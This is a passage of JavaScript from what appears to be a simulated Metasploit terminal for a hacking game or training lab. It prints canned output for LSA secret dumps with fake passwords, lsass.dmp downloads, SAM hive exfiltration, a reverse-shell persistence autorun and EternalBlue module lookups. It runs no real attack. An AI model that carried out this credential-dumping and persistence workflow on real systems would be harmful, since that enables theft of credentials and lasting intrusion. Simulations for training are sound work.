      { t: 'cur/hex : 8c 4d 4e 3a 92 ad 1f 0b 4e 9c 8d 7a 6f 5e 4d 3c',                                   delay: jitter(15, 10) },
      { t: '    NTLM: 8c4d4e3a92ad1f0b4e9c8d7a6f5e4d3c',                                         cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(280, 90) },
      { t: 'Secret  : DPAPI_SYSTEM',                                                             cls: 'b', delay: jitter(15, 10) },
      { t: 'full   : 01 00 00 00 ' + 'a8 b9 c0 d1 e2 f3 04 15 26 37 48 59 6a 7b 8c 9d ae bf c0 d1 e2 f3'.repeat(2),  delay: jitter(15, 10) },
      { t: 'm/u    : a8b9c0d1e2f3041526374859 / 6a7b8c9daebfc0d1e2f30415',                                delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(280, 90) },
      { t: 'Secret  : NL$KM',                                                                    cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/hex : 5f e4 8a 1c 9b 3d 7f 2a 6c 4e 8b 1d 5a 9f 3c 7e b2 4d 8a 1f 6c 9e 3b 5d 7a',         delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(320, 100) },
      { t: 'Secret  : _SC_BackupAgent / service \'BackupAgent\'',                                cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: Backup2024!',                                                              cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: 'Secret  : _SC_MSSQLSERVER / service \'SQL Server (MSSQLSERVER)\'',                   cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: Sql$erver2024!',                                                           cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: 'Secret  : _SC_SQLAgent$MSSQLSERVER / service \'SQL Server Agent\'',                  cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: Sql$erver2024!',                                                           cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: 'Secret  : _SC_W3SVC / service \'World Wide Web Publishing Service\'',                cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: W3bSvc#2024',                                                              cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: 'Secret  : _SC_VeeamBackupSvc / service \'Veeam Backup Service\'',                    cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: V33mB4ckup#24',                                                                     delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: 'Secret  : _SC_MSExchangeIS / service \'Microsoft Exchange Information Store\'',      cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: Exch4ng3!Service',                                                         cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: 'Secret  : _SC_GoogleUpdaterService / service \'Google Updater\'',                    cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/hex : (null)',                                                                            delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(280, 90) },
      { t: 'Secret  : aspnet_WP_PASSWORD',                                                       cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: iis_p00l_pw_2024',                                                         cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(280, 90) },
      { t: 'Secret  : DPAPI_SYSTEM_BACKUPKEY',                                                   cls: 'b', delay: jitter(15, 10) },
      { t: 'full   : 02 00 00 00 7c 8d 9e af b0 c1 d2 e3 f4 05 16 27 38 49 5a 6b 7c 8d 9e af b0',         delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(320, 100) },
      { t: 'Secret  : RasDialParams!S-1-5-21-3471439708-2069099870-1234567890-1106',             cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: VPN_Em3rg3ncy!2024',                                                       cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(320, 100) },
      { t: 'Cached domain logon information (1):',                                               cls: 'b', delay: jitter(15, 10) },
      { t: '----------------------------------------',                                           cls: 'd', delay: jitter(15, 10) },
      { t: '[1] CORP\\jane.smith',                                                                        delay: jitter(15, 10) },
      { t: '    Iterations    : 10240',                                                          cls: 'd', delay: jitter(15, 10) },
      { t: '    MsCacheV2     : 9c4f1e3a5b7d9f1c3e5a7b9d1f3c5e7a',                                        delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: '[2] CORP\\r.brown',                                                                           delay: jitter(15, 10) },
      { t: '    Iterations    : 10240',                                                          cls: 'd', delay: jitter(15, 10) },
      { t: '    MsCacheV2     : 1e3a5b7d9f1c3e5a7b9d1f3c5e7a9b1d',                                        delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 70) },
      { t: '[3] CORP\\helpdesk',                                                                          delay: jitter(15, 10) },
      { t: '    Iterations    : 10240',                                                          cls: 'd', delay: jitter(15, 10) },
      { t: '    MsCacheV2     : 3a5b7d9f1c3e5a7b9d1f3c5e7a9b1d3f',                                        delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(50, 20) },
    ],
    lines: [],
  },

  // ── msf: download lsass.dmp — animated progress (large file) ─────────────
  {
    id: 'msf-download-lsass',
    match: c => /^download\s+\S+lsass\.dmp\b/i.test(c) && SIM.msfMeter && !SIM.msfMeterWin && SIM.lsassDumped,
    stepLines: [
      { t: (cmd) => {
          const m = cmd.match(/^download\s+(\S+)(?:\s+(\S+))?/i);
          const src = m[1].replace(/^["']|["']$/g, '');
          const dst = m[2] ? m[2].replace(/^["']|["']$/g, '') : '/tmp/' + src.split(/[\\/]/).pop();
          return '[*] downloading: ' + src + ' -> ' + dst;
        }, cls: 'b', delay: jitter(180, 60) },
      { t: (cmd) => {
          const m = cmd.match(/^download\s+(\S+)/i);
          return '[*] Downloaded 4.00 MiB of 47.00 MiB (8.51%): ' + m[1].replace(/^["']|["']$/g, '');
        }, delay: jitter(550, 150) },
      { t: (cmd) => {
          const m = cmd.match(/^download\s+(\S+)/i);
          return '[*] Downloaded 12.00 MiB of 47.00 MiB (25.53%): ' + m[1].replace(/^["']|["']$/g, '');
        }, delay: jitter(800, 200) },
      { t: (cmd) => {
          const m = cmd.match(/^download\s+(\S+)/i);
          return '[*] Downloaded 24.00 MiB of 47.00 MiB (51.06%): ' + m[1].replace(/^["']|["']$/g, '');
        }, delay: jitter(1100, 250) },
      { t: (cmd) => {
          const m = cmd.match(/^download\s+(\S+)/i);
          return '[*] Downloaded 36.00 MiB of 47.00 MiB (76.60%): ' + m[1].replace(/^["']|["']$/g, '');
        }, delay: jitter(1100, 250) },
      { t: (cmd) => {
          const m = cmd.match(/^download\s+(\S+)/i);
          return '[*] Downloaded 47.00 MiB of 47.00 MiB (100.00%): ' + m[1].replace(/^["']|["']$/g, '');
        }, delay: jitter(900, 200) },
      { t: (cmd) => {
          const m = cmd.match(/^download\s+(\S+)(?:\s+(\S+))?/i);
          const src = m[1].replace(/^["']|["']$/g, '');
          const dst = m[2] ? m[2].replace(/^["']|["']$/g, '') : '/tmp/' + src.split(/[\\/]/).pop();
          return '[*] download   : ' + src + ' -> ' + dst;
        }, cls: 'g', delay: jitter(150, 50) },
      { t: '', delay: jitter(30, 10) },
    ],
    lines: [],
    after: (cmd) => {
      const m = cmd.match(/^download\s+(\S+)(?:\s+(\S+))?/i);
      if (!m) return;
      const src = m[1].replace(/^["']|["']$/g, '');
      const dst = m[2] ? m[2].replace(/^["']|["']$/g, '') : '/tmp/' + src.split(/[\\/]/).pop();
      SIM.files[dst] = '[BINARY MINIDUMP — 47.0 MB]';
    },
  },

  // ── msf: download (Meterpreter file transfer — small/generic files) ──────
  {
    id: 'msf-download',
    match: c => /^download\s+\S+/i.test(c) && SIM.msfMeter && !SIM.msfMeterWin,
    lines: [{ t: (cmd) => {
      const m = cmd.match(/^download\s+(\S+)(?:\s+(\S+))?/i);
      const src = m ? m[1].replace(/^["']|["']$/g, '') : '';
      const dst = m && m[2] ? m[2].replace(/^["']|["']$/g, '') : '/tmp/' + (src.split(/[\\/]/).pop() || 'file');
      const srcLower = src.toLowerCase();
      // SAM hive exfil
      if (srcLower.includes('sam.save') || srcLower.includes('system.save') || srcLower.includes('security.save')) {
        SIM.files[dst] = '[BINARY REGISTRY HIVE]';
        return { openMsf: true, msfEcho:
          '[*] downloading: ' + src + ' -> ' + dst + '\n' +
          '[*] download   : ' + src + ' -> ' + dst
        };
      }
      // Generic file in known Windows paths — let it through with no-op exfil
      if (/^[a-z]:\\/i.test(src)) {
        SIM.files[dst] = '[BINARY FILE]';
        return { openMsf: true, msfEcho:
          '[*] downloading: ' + src + ' -> ' + dst + '\n' +
          '[*] download   : ' + src + ' -> ' + dst
        };
      }
      return { openMsf: true, msfEcho:
        '[-] core_channel_open: Operation failed: The system cannot find the file specified.'
      };
    }}],
  },

  // ── msf: upload (counterpart, mostly for completeness) ───────────────────
  {
    match: c => /^upload\s+\S+/i.test(c) && SIM.msfMeter && !SIM.msfMeterWin,
    lines: [{ t: (cmd) => {
      const m = cmd.match(/^upload\s+(\S+)(?:\s+(\S+))?/i);
      const src = m ? m[1] : '';
      const dst = m && m[2] ? m[2] : 'C:\\Windows\\Temp\\' + (src.split(/[\\/]/).pop() || 'file');
      return { openMsf: true, msfEcho:
        '[*] uploading  : ' + src + ' -> ' + dst + '\n' +
        '[*] uploaded   : ' + src + ' -> ' + dst
      };
    }}],
  },

  // ── msf: run persistence — already installed (refuse second run) ─────────
  {
    match: c => /^run\s+persistence\b/i.test(c) && SIM.msfMeter && !SIM.msfMeterWin && SIM.persistenceInstalled,
    lines: [
      { t: '[-] Persistence script already executed in this session.', cls: 'r' },
      { t: '[-] Cleanup resource file: /root/.msf4/logs/persistence/WIN7-PC_20240115.4823/WIN7-PC_20240115.4823.rc', cls: 'd' },
    ],
  },

  // ── msf: run persistence — installs reverse-shell autorun ────────────────
  {
    id: 'msf-persistence',
    match: c => /^run\s+persistence\b/i.test(c) && SIM.msfMeter && !SIM.msfMeterWin && !SIM.persistenceInstalled,
    stepLines: (() => {
      // Random-looking 8-char filename, like the real script generates
      const rand = () => Array.from({length: 8}, () =>
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random()*52)]
      ).join('');
      const vbsName = rand();
      const regKey  = rand() + rand().slice(0,4);
      return [
        { t: '[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.', cls: 'y', delay: jitter(80, 30) },
        { t: '[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]',          cls: 'y', delay: jitter(15, 10) },
        { t: '[*] Running Persistence Script',                                                   cls: 'b', delay: jitter(420, 140) },
        { t: '[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN7-PC_20240115.4823/WIN7-PC_20240115.4823.rc', cls: 'b', delay: jitter(280, 90) },
        { t: '[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444', cls: 'b', delay: jitter(900, 280) },
        { t: '[+] Persistent agent script is 99629 bytes long',                                  cls: 'g', delay: jitter(1100, 320) },
        { t: '[+] Persistent Script written to C:\\Windows\\Temp\\' + vbsName + '.vbs',           cls: 'g', delay: jitter(680, 200) },
        { t: '[*] Executing script C:\\Windows\\Temp\\' + vbsName + '.vbs',                       cls: 'b', delay: jitter(420, 140) },
        { t: '[+] Agent executed with PID 2148',                                                 cls: 'g', delay: jitter(1900, 500) },
        { t: '[*] Installing as autorun in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\' + regKey,  cls: 'b', delay: jitter(800, 250) },
        { t: '[+] Installed autorun in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\' + regKey,      cls: 'g', delay: jitter(620, 180) },
        { t: '',                                                                                          delay: jitter(50, 20) },
      ];
    })(),
    lines: [],
    after: () => { SIM.persistenceInstalled = true; },
  },

  // ── msf: shell (drop to windows cmd) ─────────────────────────────────────
  {
    match: c => c === 'shell' && SIM.msfMeter,
    loadTime: () => jitter(800, 200),
    lines: [{ t: () => {
      SIM.msfMeterWin = true;
      return { openMsf: true, msfEcho: 'Process 1337 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\n(c) 2009 Microsoft Corporation. All rights reserved.' };
    }}],
  },

  // ── msf: meterpreter windows shell — type secret.txt ─────────────────────
  {
    id: 'msf-shell-loot',
    match: c => SIM.msfMeterWin && c.toLowerCase().includes('secret.txt'),
    lines: [{ t: () => ({ openMsf: true, msfEcho:
      'FLAG{secret_docs_exfiltrated}\n' +
      '\n' +
      'Project Nightfall — Eyes Only\n' +
      'Target acquisition complete. Funds transferred.\n' +
      'Do not discuss on unsecured channels.'
    })}],
  },

  // ── msf: sessions ─────────────────────────────────────────────────────────
  {
    match: c => /^sessions/.test(c) && SIM.msf,
    lines: [{ t: () => {
      if (!SIM.msfSessions.length) return { openMsf: true, msfEcho: 'No active sessions.' };
      return { openMsf: true, msfEcho:
        'Active sessions\n' +
        '===============\n\n' +
        '  Id  Name  Type                     Information                   Connection\n' +
        '  --  ----  ----                     -----------                   ----------\n' +
        `  1         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ WIN7-PC  10.10.10.5:4444 -> 10.10.10.10:49158`
      };
    }}],
  },

  // ── msf: search ───────────────────────────────────────────────────────────
  {
    match: c => /^search\s+/.test(c) && SIM.msf,
    lines: [{ t: c => {
      const q = c.replace(/^search\s+/, '').trim().toLowerCase();
      const hit = q.includes('17') || q.includes('eternal') || q.includes('smb') || q.includes('exploit');
      if (hit) {
        SIM.msfLastSearch = [
          'exploit/windows/smb/ms17_010_eternalblue',
          'exploit/windows/smb/ms17_010_psexec',
        ];
      } else {
        SIM.msfLastSearch = [];
      }
      return { openMsf: true, msfEcho:
        `Matching Modules\n` +
        `================\n\n` +
        `   #  Name                                      Disclosure Date  Rank    Check  Description\n` +
        `   -  ----                                      ---------------  ----    -----  -----------\n` +
        (hit
          ? `   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       great   Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n` +
            `   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n\n` +
            `Interact with a module by name or index. For example \x1b[33minfo 0\x1b[0m, \x1b[33muse 0\x1b[0m or \x1b[33muse exploit/windows/smb/ms17_010_eternalblue\x1b[0m`
          : `   0  (no results for '${q}')`)
      };
    }}],
  },

  // ── msf: info ─────────────────────────────────────────────────────────────
  {
    match: c => c === 'info' && SIM.msf && SIM.msfModule,
    lines: [{ t: () => ({ openMsf: true, msfEcho:
      `       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n` +
      `     Module: exploit/windows/smb/ms17_010_eternalblue\n` +
      `   Platform: Windows\n` +
      `       Arch: x86, x64\n` +
      `Privileged?: Yes\n` +
      `    License: Metasploit Framework License (BSD)\n` +
      `       Rank: Great\n\n` +
      `Provided by:\n  Sean Dillon <sean.dillon@risksense.com>\n  Dylan Davis <dylan.davis@risksense.com>\n\n` +
      `Description:\n  This module exploits a vulnerability in the SMBv1 protocol.\n` +
      `  The vulnerability allows remote code execution via a specially crafted\n` +
      `  packet. This was used by the WannaCry ransomware in May 2017.`
    })}],
  },

  // ── msf: back ─────────────────────────────────────────────────────────────
  {
    match: c => c === 'back' && SIM.msf,
    lines: [{ t: () => { SIM.msfModule = null; return { openMsf: true }; } }],
  },

  // ── msf: exit / quit ──────────────────────────────────────────────────────
  {
    match: c => (c === 'exit' || c === 'quit') && SIM.msf,
    lines: [{ t: () => { SIM.msf = false; SIM.msfModule = null; SIM.msfMeter = false; SIM.msfMeterWin = false; return ''; } }],
  },

);
